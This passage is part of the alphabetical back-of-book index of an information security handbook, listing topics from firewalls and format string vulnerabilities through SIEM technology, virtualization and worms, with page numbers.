mobile device security, 53, 54
operating modes, 76
security layers, 74–76
SIEM technology selection, 121
Firmware, information flow paths, 260
Flow points, open standards, 65–67
Forensics
insider threat risk mitigation, 136
SIEM technology benefits, 116
virtualization; See Virtualization
Format string vulnerabilities, 199–206
availability impact, 203
and buffer overflow, 205–206
confidentiality impact, 202–203
control/mitigation measures, 203–204
defining format string, 200–201
example of, 201–202
integrity impact, 203
management controls, 204
technical controls, 204–205
Form-based authentication, 25
Fraggle, 83–84
Fraud, security education and training, 96
FTK Imager, 358
Full interruption testing, continuity plan, 330
Functionality, SIEM technology, 124–125
G
Gateway monitoring, Bluetooth security, 342
Global offset tables (GOT), 203
Global Regular Expression Parser (GREP), 205
Google, mashups, 189, 190, 192
Group attribute, AC, 13
H
Halon fire suppression systems, 367–374
Handheld devices, data at rest, 285
Handwriting samples, identity management 
systems, 26
Hardware
data at rest protection, 289, 291
information flow paths, 260
Hardware-based access control, identity 
management systems, 25–26
Hardware tokens, single sign-on systems, 26
Hash function; See Message digests
Hashing algorithms, 220–221, 222
HeloMoto attack, Bluetooth, 344
Hierarchical PKI, 16
Historical data retrieval, SIEM technology, 113
Host, firewall security layers, 74
Hub and spoke model, permission 
management, 5–6
Human resources; See also Personnel
insider threat risk mitigation, 134, 136
mobile device security, 54
Hupp worm, 82
Hypertext Markup Language (HTML), 36
Hypervisor, 349, 361
I
Identification challenges, virtualization, 355
Identity
PKC versus AC, 6–9, 12
security education and training, 96
Identity management system
components of, 19–30
access control, 25–27
delegated administration, 27–29
directory, 21–23
directory integration, 23–25
provisioning, 29–30
features and requirements, 19–20
IdM project, directory location, 22
IE-MAP, 65
IETF, 64, 68
IF-MAP, 69
IFrame, mashup security, 197
Impact analysis, 314, 319–321
Implementation
NIST Risk Management Framework, 159
SIEM technology selection, 120–121, 
123–124
Incident histories, privacy and information 
security education considerations, 99
Incident management
fast scanning worm defense, 210–211
SIEM technology, 116, 117; See also Security 
information and event management 
(SIEM) technology

Index  ◾  409
Information assurance, information flow, 240, 
241–243
Information flow, 240–279
attack methods, 252–255
complications, 250–251, 252
conceptual overview, 240–241
countermeasure selection, 255–269
components of flowpath, 260–261
data lineage, 256–258
security services, 261–263
subjects, 258–260
covert channels, 273–278
attacks modifying, 274–275
defenses, 276–278
observable properties, 275–276
data lineage, 243–244, 245
emerging and potential technologies, 
270–273
information assurance, 241–243
within systems, 247–256
tracking, 244, 246–247
Information management; See Security 
information and event management 
technology
Information warfare, information flow attack 
methods, 253, 254
Infrared ports, 48
Infrastructure
Blackberry, 49–50
mobile devices, 52
mobile device security, 53, 54
permission management; See Permission 
Management Infrastructure
SISA, 295
innerHTML, 196
innerText, 196, 197
Input validation
format string vulnerability controls, 206
mashup security, 196
Insider threats, 127–136
accidents and carelessness, 132
case examples, 128–129
employee attitudes and, 130–131
information flow security, 272–273
mitigation of risk, 133–135
outside threat prevention methods and, 133
security weaknesses, 33–39
US-CERT survey, 131–132
Inspection, information flow security, 264, 265
Installation, SIEM technology selection, 
120–121
Integration, SIEM technology selection, 122
Integrity, data; See Confidentiality, integrity, 
availability (CIA); Data integrity
Integrity monitoring, information flow security, 
269
Integrity validation, information flow attack 
methods, 254
Interception, information flow attack methods, 
253
Interoperability
SIEM technology selection, 120
standards-based, 60, 63
Intersystem flow, information flow paths, 261
Intrasystem flow, information flow paths, 
260–261
Intrusion detection
covert channel attack countermeasures, 277
information flow security, 265, 266–267, 
269
SIEM technology; See Security information 
and event management (SIEM) 
technology
SIEM technology benefits, 115–116
Intrusion prevention, SIEM technology, 122
Inventories; See also Asset inventory
information flow security, 264–265
mobile devices, 45–46, 50–51
iPOD, pod slurping, 141
IRC, botnet command and control, 83
ISMHAG, 13
Isolation, virtual machines, 352, 353, 359–360
Issuer
access control, PKC and AC, 11
AC validation, 16
IT Infrastructure Library (ITIL) practices, 170
J
Java applets, security threats, 36
Java scripts
mashups, 191, 192
mashup security, 196, 197
security threats, 36
JSON padding, 194
K
Keyboard functions, security threats, 37, 38
Keyed hash, 220, 224

410  ◾  Index
Key exchange sniffing, 344
Key fobs, 25–26
Key generation, Bluetooth devices, 338, 339
Keystroke loggers, 252, 253, 265
Key usage, PKC extensions, 12
Knowledge levels, privacy and information 
security education considerations, 99
L
Layered physical security controls, 396
Layering, SIEM technology selection, 121
LDAP directory, 14
AC validation, 16
attribute certificate publication, 16–17
identity management systems, 20, 21–25
maturity indicators, 31
problem indicators and solutions, 20
Leadership, NERC corporation compliance 
review, 168
Least functionality
covert channel attack countermeasures, 278
information flow security, 267
Least privilege
covert channel attack countermeasures, 
277
information flow security, 265, 267
LED indicators, covert channel discovery, 274
Legal requirements, privacy and information 
security education, 91, 93–94
Levels of knowledge, privacy and information 
security education considerations, 
99
Levels of protection, SIEM technology, 125
Libraries, format string vulnerability controls, 
205
Lineage, data, 243–244
Linux, virtual machines, 354
Literal string comparison, SOP enforcement, 
193
Log aggregation, SIEM technology, 113
Log data
insider threat risk mitigation, 136
NERC corporation compliance review, 177
SIEM technology
benefits, 114
selection criteria, 121
Log files, virtual machines, 357, 359
Logical access control, 265, 267
Logical attacks, 252, 253, 255, 264–265
Log management, SIEM technology selection, 
121
Log storage, SIEM technology, 113
M
Mainframe, identity management system 
maturity indicators, 31
Maintenance
continuity program, 327, 330–334
CPTED, 379, 387
NERC corporation compliance review, 177
SIEM technology selection, 121, 123–124
Malicious software
information flow security
attack methods, 253, 254
countermeasures, 265, 269
NERC corporation compliance review, 180
Management
changing trends in oversight of information 
security, 154
information flow security, 266–267
security assessment and review, 160
three Ms of security, 152
Management controls
Bluetooth security, 341, 346
format string vulnerabilities, 204–205
NERC corporation compliance review, 
167–170
Management issues
data ownership issues, 24–25
insider threat risk mitigation, 133–134
SIEM technology selection, 122
Mandatory access control, hub and spoke 
model, 6
Man-in-the-middle (MITM) attacks, 
Blutetooth devices, 341
Many-to-many information movement, 
information flow security, 263
Mashups, 189–198
architecture, 190–191
control/mitigation measures, 196–198
defined, 190
editors, 191, 192
impact on confidentiality, integrity, and 
availability, 194–196
versus portal, 191–192
security, 192–194
types of, 190
Maturity, identity management systems, 30–31

Index  ◾  411
Measurement
quantum computing problems, 230–231
three Ms of security, 152
Media, information flow attack methods, 253
Memory paging file, 357, 358
Memory purges, mobile device security, 52–53
Memory sticks, 47, 49, 52
Menus, security threats, 35–36
Merkle-Dåmgard hash function, 220
Message authentication code (MAC), hash 
functions, 220–221
Message digests
algorithms, 222–224
applications/purpose of, 219
defined, 217–218
future prospects, 224
hashing algorithm methods, 220–221
resources, 225–226
strengthening, 224
strengths and weaknesses, 222
Messaging, security education and training, 96
Messaging servers, mobile device security, 54
Metadirectory
identity management systems, 23–25
maturity indicators, 31
problem indicators and solutions, 20
single sign-on systems, 26, 27, 30
provisioning layer, 29
Metrics, continuity program maintenance, 
333–334
Microsoft systems, security threats, 35–39
Milieu, CPTED, 379–380, 387
Mitigation
Format string vulnerabilities, 203–204
mashups, 196–198
Mobile data security, 43–55
assessing and auditing, 54
asset inventory, 45–46
controls and safeguards, 50–54
data at rest, 285
types of risks, 46–50
Mobile devices, pod slurping, 141
Mobility, virtual machines, 354
ModSecurity, 76
Monitoring
backups and restores, 306
covert channel attack countermeasures, 
278
firewalls, 76
information flow security, 269, 272
mobile devices, 49
mobile device security, 53
NERC corporation compliance review
physical security, 177
security status, 181–182
NIST Risk Management Framework, 159
physical security, 396
security assessment and review, 160
SIEM technology, 115, 118–119
three Ms of security, 152
Multimedia message service (MMS), 48
Multiple access control assignments, 6
N
Natural access control, CPTED, 379, 386
Natural surveillance, CPTED, 379, 385–386
Need-to-know access
insider threat risk mitigation, 134
NERC corporation compliance review, 
170
NERC corporation compliance review; See 
Compliance review, NERC
NetFlow, 65
Network
data at rest protection, 288
firewall security layers, 74
identity management systems, LDAP 
distribution, 21
information flow security, 262
SIEM technology, 113
benefits, 117
operational liabilities, 118
SISA; See Secure information sharing 
architecture (SISA) case study
Networking, mashups; See Mashups
Network interception, information flow attack 
methods, 253
Network Operations Center (NOC), 49–50
Network transmission, information flow attack 
methods, 253, 254
Neural networks, quantum, 233
New applications, identity management 
systems, 20
New privilege requests, delegated 
administration and, 31
New technology use and misuse cases, 
continuity management priorities, 
315–316
New user creation, identity management 
systems, 29–30
NIST Risk Management Framework, 158–159

412  ◾  Index
Nondeterministic random bit generator 
(NRBG), 219
Notepad, security threats, 36
O
OASIS, 68
OBEX protocol, 339
Object identifier (OID), 13
Objectives
information flow security, 262, 263
security assessment and review, 159
Object owners, security threats, 37
Objects
hub and spoke model, 9
security threats, 36–37, 39
One-to-many information movement, 
information flow security, 262
One-to-one information movement, 
information flow security, 262
One-wayness property, 218
OODA loop, 66
OpenAjax Alliance, 197
Open architecture, information flow paths, 261
Open Group, 68
Open standards, 58–76
customer-vendor, 60–61
endpoints, flowpoints, and threat state 
database, 65–67
importance of, 67–70
mission/practice, 58–60
revolution versus evolution, 61–63
visibility, 63–64
Operating range, Bluetooth security, 338, 342
Operating system-integrated certificate 
authorities; See Certificate authorities
Operating systems
data at rest protection, encryption, 289
information flows, 247–250, 260
security controls, 33, 34
virtualization environment, 349, 350, 352, 
354
virtualization techniques, 361, 362
Operational controls, Bluetooth security, 
342–343, 346
Operations
SIEM technology
downsides, 118
selection criteria, 121
tape backup validation, 303–309
Organizational alliances, data needing security 
controls, 257
Organizational culture, privacy and 
information security education, 
91–92
Outside partners
identity management systems, 28–29
security education and training, 97
Ownership, metadirectories, 24–25
P
Parallelism, quantum, 230
Parallel testing, continuity plan, 329–330
Paravirtualization, 350
Partitioning, virtual machines, 353–354
Passive firewalls, 76
Passive mode, firewalls, 76
Passwords
BIOS, 44, 51
Bluetooth security, 342
identity management systems
problem indicators and solutions, 20
single sign-on systems and, 26, 27
information flow protection methods, 257
insider threat risk mitigation, 136
mobile device security, 51, 52–53
script attacks, 195
tape backup systems, 304
Password theft, 195
PCI/DSS 12-step program, 152
Peer-to-peer applications, covert channel 
attacks, 275
Penetration, four steps of security life cycle, 152
Performance, SIEM technology selection, 119
Performance issues, insider threat risk 
mitigation, 134
Perimeters
mashup security, 193
NERC corporation compliance review, 
172–175
PERMIS, 5, 15
Permission Management Infrastructure (PMI)
attribute certificates, 13–15, 16–17
multiple AC assignments, 6
Permission management systems; See also 
Attribute certificates, access control 
expansion with
Personnel
continuity management priorities, 318–319

Index  ◾  413
data needing security controls, 257
data ownership issues, 24–25
identity management systems, 20
information flow security
countermeasures, 265, 266–267
types of subjects, 258–259
NERC corporation compliance review, 
170–172
security education and training; See also 
Security and privacy education
awareness training, 161–162
target groups, 96–98
termination issues
insider threats, 130–131, 136
mobile device security, 54
site access permits, 396
Physical controls
firewall security layers, 74
information flow security, 265, 266–267
Physical Disk Emulator, 358
Physical inspection, information flow security, 
263, 264, 265–266
Physical security
CPTED; See Crime prevention through 
environmental design
data at rest protection, 287, 291
Halon fire suppression systems, 367–374
information flow security
attack methods, 252–253, 254, 255
countermeasures, 264–265
NERC corporation compliance review, 170, 
175–178
site selection and facility design, 393–399
tape backup systems, 304
PIN, Bluetooth devices, 338, 339, 342
PKC; See Public key certificates
PKI; See Public key infrastructure (PKI)
PKIXCMP, 13
Plagiarism detection methods, 273
Planning
continuity program, 324–334
CPTED, 382–384
data needing security controls, 257
Platforms, virtual machines, 362
Plug-ins
firewalls, 76
mashup security, 194
security threats, 36–37
PMI; See Permission Management 
Infrastructure
Pod slurping, 137–144
incentives/motives, 138–139
mechanism of, 140–141
products, 144
security threats and countermeasures, 
141–144
USB data leakage, 141
USB versions, 139–140
vulnerabilities, 145–147
Policies/standards/procedures, 34
AC versus PKC extensions, 12
Bluetooth security, 341
commercial software support features, 37
controls for
controls for, 34
firewalls, 76
security threats, 38–39
fast scanning worm defense, 211
firewall security layers, 74
information flow security, 261, 264, 265
insider threat risk mitigation, 133–134
mobile device security, 51–52, 54
NERC corporation compliance review, 
167–168
security education and training, 91, 96, 101
SIEM technology
benefits, 114–115
lessons learned, 124
Popfly mashup editor, 191, 192
Portable data devices, pod slurping, 137–144, 
145–147
Portal, mashup versus, 191–192
Ports
information flow security, 261
NERC corporation compliance review, 
179–180
tape backup system security, 305
Power supply, physical security requirements, 
397
Pre-employment screening, insider threat risk 
mitigation, 134
Pre-image resistance, 218, 219
printf family of functions, 200–201, 204–205
Print function, 36
Print Screen function, 37, 38
Privacy; See Security and privacy education
Privacy information, data needing security 
controls, 257
Privacy issues, virtualization and, 352
Private key usage period, PKC extensions, 12
Privilege escalation, information flow attack 
methods, 253, 254
Privileges
attribute authority, 16

414  ◾  Index
discretionary access control weaknesses, 252
information flow security, 265
insider threat risk mitigation, 136
modification of, 9
new privilege requests, 31
Permission Management Infrastructure 
(PMI), 15
SIEM technology selection, 121
Process flow, identity management systems, 
27–29
Process monitoring, covert channel attack 
countermeasures, 278
Product cycle, versus threat cycle, 61, 62–63
Product security, SIEM technology selection, 
121
Program output, covert channel attacks, 
274–275
Proprietary information, data needing security 
controls, 257
Protocols, information flow security, 261
Provisioning, identity management systems
components of, 29–30
maturity indicators, 31
problem indicators and solutions, 20
single sign-on systems, 27
Public key certificates (PKC), 6–13
authentication, 4
relationship between, 4–5
Public key infrastructure (PKI), 13–15
identity management systems, 31
use case, 16–17
Public/private keys, PKI, 13
Publishing, attribute certificates, 16–17
Q
Quantum computing
applications, 232–233
classical computing versus, 228–230
future prospects, 233–234
problems and solutions in, 230–232
R
RAID technology, 273
RBAC, PMI support, 15
Record-keeping/documentation of activities
covert channel attacks, 274–275
firewalls, 76
information flow security, 261
NERC corporation compliance review, 
183–184
perimeters, electronic, 174–175
systems security management, 182
NIST Risk Management Framework, 159
privacy and information security education, 
100
security assessment and review, 160
SIEM technology selection, 122
Recovery
insider threat risk mitigation, 136
NERC corporation compliance review, 
184–186
physical facility audits, 398
tape backup validation, 303–309
Redeployment, NERC corporation compliance 
review, 182
Registration
Permission Management Infrastructure 
(PMI), 14
PKI, 13
Registry editing, 34
Regulatory requirements
information flow security, 261
security education and training, 91, 93–94
SIEM technology, 113, 114–115
Relational database
identity management system maturity 
indicators, 31
user information, 21–22
virtual directories and metadirectories, 
23–24
Remediation, four steps of security life cycle, 
152
Remote access Trojans, 79
Remote users, 79, 84, 133
Remote wiping, mobile device security, 54
Removable media, security threats, 34
Repeat, four steps of security life cycle, 152
Reports/reporting; See Record-keeping/
documentation of activities
Research and development, data needing 
security controls, 257
Research in Motion Network Operations 
Center, 49–50
Response plan
fast scanning worm defense, 211
NERC corporation compliance review, 183
Response to incidents, SIEM technology 
benefits, 115

Index  ◾  415
Restore functions
NERC corporation compliance review, 
185–186
SIEM technology selection, 122
Retina scans, identity management systems, 26
Reverse proxy, firewalls, 76
Revision, continuity plans, 331–332
Revocation
AC validation, 16
attribute certificates, 12
Permission Management Infrastructure 
(PMI), 15
Revolution versus evolution, open standards, 
61–63
RFC3280, 9, 10, 12
RFC3281, 4, 9, 11, 12, 15
RFC4525, 22
RFC4527, 22
RFC4528, 22
Risk assessment
NERC corporation compliance review, 172
privacy and information security education 
considerations, 99
security education and training, 101
Risk factors
insider threats
case examples, 131–132
employee attitudes and, 130–131
mitigation of, 133–135
SIEM technology, 125
Role attribute, AC, 13
Role-based access control, 4, 28
Role-based authentication and authorization, 
SISA, 295
Routing, firewalls, 76
Rules
identity management systems, 31
metadirectory, 23–24
SIEM technology selection, 122
S
Salaries, data needing security controls, 257
Same-origin policy (SOP), mashup security, 
193–194
Save commands, security threats, 35–36
Scalability, SIEM technology selection, 120
Screen capture features, security threats, 37
Scripts, security threats, 36
Secure hash algorithm, 222
Secure information sharing architecture (SISA) 
case study, 291–299
access protection, 297
adaptive threat defense, 298
architecture, 293, 295
content protection, 297
data protection, 298
definition of SISA, 291
endpoint protection, 295–296
history, 292–293, 294
summary, 298–299
technology for defense in depth, 295–299
Security and privacy education, 90–109
basics, 109
insider threat risk mitigation, 134
legal and regulatory requirements, 93–94
necessity for business success, 90–92
privacy principles, 95–96
program effectiveness, 92–93
sample content, 102–103
SIEM technology benefits, 116–117
social engineering, 103–109
strategies for, 98–102
awareness degradation, events affecting, 
99–100
components of, 100–102
documentation of activities, 100
effectiveness of existing programs, 
98–99
language and regional challenges, 100
levels of knowledge, 99
prior incidents, 99
risk estimation, 99
timing for awareness and training 
activities, 100
utilization of existing programs, 98
target groups, 96–98
topics, 94–96
Security information and event management 
(SIEM) technology, 112–126
benefits, 113–117
compensating for intrusion detection 
technology limitations, 115–116
compliance with security regulations, 
114–115
healthy network maintenance, 117
identifying significant versus 
nonsignificant events, 115
incident response management, 116, 117
labor cost reduction, 114
log data archival and log management, 
114

416  ◾  Index
raising level of intrusion detection 
expertise, 116
threat analysis, 115
training and security awareness, 116–117
downsides, potential, 117–119
expense, 117–118
false sense of well-being, 118–119
operational liabilities, 118
functions, 112–113
lessons learned, 124–125
selection and use of tools, 119–124
implementation and maintenance, 
123–124
selection criteria, 123–124
Security information management systems, 
insider threat risk mitigation, 136
Security levels, hub and spoke model, 6
Security life cycle, four steps of, 152
Security patch management, NERC 
corporation compliance review, 180
Security services
information flow attack countermeasures, 
261–263
information flow protection methods, 256
Security solutions, continuity management 
priorities, 317–318
Security weaknesses, 33–39
insider threats, 33–34
interface, 35–37
proposed solutions, 37–39
Segmentation violations (SEGV), 203
Segregation, covert channel attack 
countermeasures, 277
Semantics, mashup security, 197
Sensitive information, SIEM technology 
specifications, 124
Separation of duties
information flow security, 265, 266–267
insider threat risk mitigation, 134
Serial number, access control, PKC and AC, 11
Serial number, PKC, 4
Servers
data at rest, 286
data at rest protection, 290
firewall security layers, 74
LDAP, 21
mobile device security, 54
Server-side management software, key fobs, 
25–26
Service accounts, information flow security, 259
Service authentication information attribute, 
AC, 13
Service providers, mobile device attack vectors, 
48, 50–51
Services, NERC corporation compliance review, 
179–180
SESAME, 5
Session tokens, single sign-on systems, 26
SETI model, 66
sFlow, 65, 67
Shoch, 82
Short message service (SMS), 48, 49
SIEM technology; See Security information and 
event management technology
Signatures, AC, AC validation, 16
Simple Network Management Protocol 
(SNMP), 118
Simulation testing, continuity plan, 329
Single sign-on (SSO) systems, 20, 26–27
architecture, 30–31
delegated administration, 28
maturity indicators, 31
SISA; See Secure information sharing 
architecture (SISA) case study
Smart cards, identity management systems, 26
Smart handheld devices, data at rest, 285
Smart phones, 49
sMash, 197, 198
Smurf, 83–84
Snapshots, virtual machines, 355, 357, 
358–359
Social engineering
information flow attack methods, 253
security education and training, 96, 
103–109
Software
Bluetooth security, 342
continuity program maintenance, 
332–333
covert channel attack countermeasures, 
277
data at rest protection, 289, 290, 291
mobile device attack vectors, 47
mobile device threats, 49
Software Engineering Institute CERT program, 
131–132
Source code access, security threats, 36, 37
Spambotnet Wars of 2003, 84
Spatial distancing, Bluetooth security, 342
SQL slammer, 208–210
src attributes, mashup security, 194
Stability, SIEM technology selection, 120
Staff training; See also Security and privacy 
education

Index  ◾  417
Stakeholders, security assessment and review, 
159
Standardization, data at rest protection, 288, 
290, 291
Standard operating procedure
backup plan template, 308
mashup security, 193–194
Standards
Bluetooth security, 341
information flow security, 264
message digests, 225–226
open; See Open standards
Star topology, 17
Status indicators
covert channels, 274
SIEM technology, 113
Steganography, 275
Storage
covert channels, 274
data at rest protection, 286–287, 290
identity management systems, 20
information flow attack methods, 253
SIEM technology selection, 121
Storage area network, SIEM technology 
benefits, 114
Storage facility, tape backup systems, 305
Storage media, information flow attack 
methods, 253, 255
Storm, 84–85
Strategic plans, data needing security controls, 
257
String comparison, SOP enforcement, 193
Style sheets, attacks modifying, 196
Sub7, 49
Subject key identifier, PKC extensions, 12
Subjects
identity management systems, 19–20
information flow attack countermeasures, 
258–260
information flow protection, 256
PKC versus AC, 6–9
Sub-layers, firewalls, 75
Superposition, 229–230
Supplementation of controls, NIST Risk 
Management Framework, 159
Surveillance, CPTED, 379, 385–386
Suspend time, Bluetooth security, 342
Switches, 65, 76
System accounts, information flow security, 
259
System call functions, security threats, 39
System configurations, data needing security 
controls, 257
System design, information flow security, 261
System integrity, covert channel attack 
countermeasures, 277
Systems security management, NERC 
corporation compliance review, 
178–182
System wrappers, security threats, 38–39
T
Tabletop walk-through testing, continuity plan, 
329
Tape backup validation, 303–309
Target hardening, CPTED, 380
Targeting
AC extensions, 16
attribute certificates, 12
Technical controls
Bluetooth security, 341–342, 346
format string vulnerabilities, 204–205
Technology, security assessment and review, 
160
Telecommunications personnel, mashup 
security, 193
Telnet, information flow security, 261
Temporary files, security threats, 35
Termination process, employee; See Personnel, 
termination issues
Territorial reinforcement, CPTED, 379, 387
Testing
continuity program, 327, 328–330, 
333–334
information flow security, 265, 268
NERC corporation compliance review
physical security, 177
systems security management, 179
SIEM technology, 125
TFN (Tribe Flood Network), 84
Theft
directed attacks, 252, 253
mashups and, 194
Third parties, security education and training, 
97
Threat analysis, SIEM technology, 113, 115
Threat cycle, product cycle versus, 61
Threats, threat cycle versus product cycle, 61, 
62–63
Threat state database, open standards, 65–67

418  ◾  Index
TIA-942, 399
Time efficiency, identity management systems, 
20, 28
Tokens
data at rest protection, 284–285, 290
format, 201–202, 204
mashup security, 197
Tools, security assessment and review, 159
Topology, SIEM technology, 113
Tracking, information flow, 244, 246–247
Trade secrets, data needing security controls, 
257
Traffic analysis, covert channel attack 
countermeasures, 277
Traffic generation, SIEM technology, 118
Traffic interception, information flow attack 
methods, 253
Traffic redirection, firewalls, 76
Training; See also Security and privacy 
education
continuity program, 326, 327–328
CPTED, 389
data at rest protection, 287–288
information flow security, 265, 266
mobile device security, 51
NERC corporation compliance review, 
170–172
security awareness, 161–162
SIEM technology
benefits, 116–117
lessons learned, 125
Transaction processing
data needing security controls, 258
information flow attack methods, 254
Transient Bluetooth Environment Auditor 
(T-BEAR), 345
Tribe Flood Network (TFN), 84
Trinoo, 84
Triple DES, 53
Trojans
information flow security, 271
mobile devices, 48
remote access, 79
Winnuke, 82–83
Trust, 13, 34
Trusted Computer System Evaluation Criteria 
(TCSEC), 264
Trusted Computing Base (TCB), 264
Trusted Computing Group (TCG), 63, 68
Trusted Network Connect (TNC) standards, 
64
Trusted Platform module (TPM), 62, 270–271
U
Unauthorized mobile devices, 48
Undiscoverable mode, Bluetooth security, 341
Unintended covert channel, 274
United States Secret Service, CERT program, 
131–132
Updates
continuity plans, 331–332
relational databases, 22
SIEM technology, 123
Urgent Pointer, 82–83
Usability, SIEM technology selection, 120
USB drives, 47, 49, 52
pod slurping, 137–144, 145–147
virtualization techniques, 354
USB port control, 284; See also Pod slurping
User accounts, information flow security, 258
User certification, delegated administration, 28
User creation, 29–30
User directory, 31
User identity, 27–29
User information
directory, 21–22
problem indicators and solutions, 20
User interface, security threats, 34, 35–37
User life cycle, identity management systems, 
29
Username/password, identity management 
systems, 25–26
User resistance, mobile device security, 55
User training; See Training
U.S. National Institute of Standards and 
Technology, mobile device security, 
53–54
V
Validation
attribute certificates, 15
information flow attack methods, 254
mashup security, 196
Permission Management Infrastructure 
(PMI), 14
tape backup, 303–309
Validity period, AC validation, 16
Vendors
mobile device security, 55
open standards, 60–61
SIEM technology selection, 122

Index  ◾  419
Version control, continuity plan, 331
Virtual compartments, SISA, 295
Virtual directory, identity management systems, 
23–25
maturity indicators, 31
problem indicators and solutions, 20
single sign-on systems, 26, 27, 30
Virtualization, 347–362
advantages, 359–361
analysis/examination, 356–359
challenges, 352–353
data at rest protection, 288, 291
definitions and history, 349–350
prevalence, 351–352
Virtual machine monitor (VMM), 349, 350, 
353, 355, 356, 359, 361
Virtual private networks (VPNs), 17, 53, 271
Viruses, information flow attack methods, 255
Visibility, open standards, 63–64
Vulnerabilities
continuity management priorities, 
316–317
SIEM technology, 125
Vulnerability assessment
information flow security, 268–269
NERC corporation compliance review, 174, 
182
Vulnerability information, SIEM technology 
selection, 122
W
Warhol worms, 207–213
Warning messages, attacks overwriting, 196
Web application firewalls (WAF), 73–76
Web Application Security Consortium 
(WASC), 73
Web-based platforms, identity management 
systems, 26
Web browsers
firewalls, 73–76
mashups; See Mashups
security education and training, 96
security threats, 36, 37, 39
Web content, covert channel attacks, 275
Whitelisting, 196
Wi-Fi spectrum, mobile device attack vectors, 
48
Windows NT, 34, 35–37
Windows XP/Vista, 64, 141
Winnuke Trojan, 82–83
Wipes, mobile device security, 52–53
Wiping of data, mobile device security, 54
Wireless security, 48
Wiring, physical security, 399
Word searches, information flow detection, 273
Workflow
identity management systems, 27–29, 31
SIEM technology, 113
Worms
fast scanning, 207–213
information flow attack methods, 255
Wrapping functions
format string vulnerability controls, 205
security threats, 38–39
X
X509, 4
X509.v3, 9, 10
XML, mashups, 192, 193
XMLHttpRequest, 192
Z
Zombies, 253



